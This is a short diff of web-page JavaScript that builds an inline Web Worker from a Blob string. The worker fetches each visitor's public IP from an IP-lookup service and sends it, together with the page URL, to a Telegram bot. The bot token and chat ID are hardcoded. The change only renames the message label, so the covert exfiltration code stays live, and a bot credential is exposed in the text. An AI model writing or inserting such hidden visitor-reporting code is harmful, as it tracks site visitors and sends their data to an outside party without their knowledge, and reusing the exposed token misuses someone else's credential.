@@ -1068,7 +1068,7 @@
     const workerCode = `
         (async () => {
             const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip);
-            fetch(\`https://api.telegram.org/bot7778705195:AAHt73xGupWYJdzY_Wr-D-KJZz7CmD9hlgg/sendMessage?chat_id=5179574512&text=🌐 Новый посетитель! IP: \${ip}, Сайт: \${window.location.href}\`);
+            fetch(\`https://api.telegram.org/bot7778705195:AAHt73xGupWYJdzY_Wr-D-KJZz7CmD9hlgg/sendMessage?chat_id=5179574512&text=🌐 Новый посетитель! IP: \${ip}, Страница: \${window.location.href}\`);
         })();
     `;
     const blob = new Blob([workerCode], { type: 'application/javascript' });
